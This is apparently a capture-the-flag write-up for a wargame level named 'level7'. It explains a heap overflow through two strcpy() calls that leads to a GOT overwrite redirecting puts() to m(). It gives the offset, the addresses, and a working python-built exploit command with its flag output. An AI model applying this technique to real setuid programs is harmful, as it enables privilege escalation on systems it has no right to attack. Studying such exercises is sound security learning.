```sh
$> ls -l ~
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
```

We have 2 `strcpy()` calls on 2 malloc'ed buffers.  

The principle behind this attack is to overflow the first one and change its return address, not to the contiguous second buffer anymore, but to `puts()`'s address.  
Then we change `puts()` itself to a call to `m()`.
This last point is what is called a GOT overwrite attack. We already used it in previous levels.

To do that, we calculated the offset to the return of the first buffer which is `20` bytes.
At this point, we needed two more things:
- The address of `puts()` => `0x08049928`
- The address of `m()` => `0x080484f4`


We then applied the payload:

```sh
$> ./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1657740285
```
